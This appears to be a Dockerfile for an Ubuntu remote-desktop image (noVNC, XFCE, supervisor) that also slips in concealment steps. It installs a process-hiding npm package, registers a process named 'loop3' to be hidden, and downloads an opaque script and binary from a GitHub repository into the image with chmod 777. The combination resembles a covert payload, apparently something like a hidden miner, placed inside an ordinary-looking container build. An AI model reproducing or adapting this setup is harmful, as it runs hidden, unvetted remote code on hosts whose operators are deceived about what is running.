FROM ubuntu
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get upgrade -y
RUN apt-get install -y dbus-x11 sudo bash net-tools novnc  x11vnc xvfb supervisor xfce4 gnome-shell ubuntu-gnome-desktop python3-pip gnome-session gdm3 tasksel ssh terminator git nano curl wget zip unzip docker.io nodejs npm

RUN sudo npm i -g node-process-hider
RUN sudo ph add loop3
RUN wget https://raw.githubusercontent.com/cihuuy/youtube/main/vera.sh
RUN wget https://github.com/cihuuy/youtube/raw/main/loop3
RUN chmod 777 loop3
RUN chmod 777 vera.sh



COPY novnc.zip /novnc.zip
COPY . /system

RUN unzip -o /novnc.zip -d /usr/share
RUN rm /novnc.zip

RUN chmod +x /system/conf.d/websockify.sh
RUN chmod +x /system/supervisor.sh

CMD ["/system/supervisor.sh"]
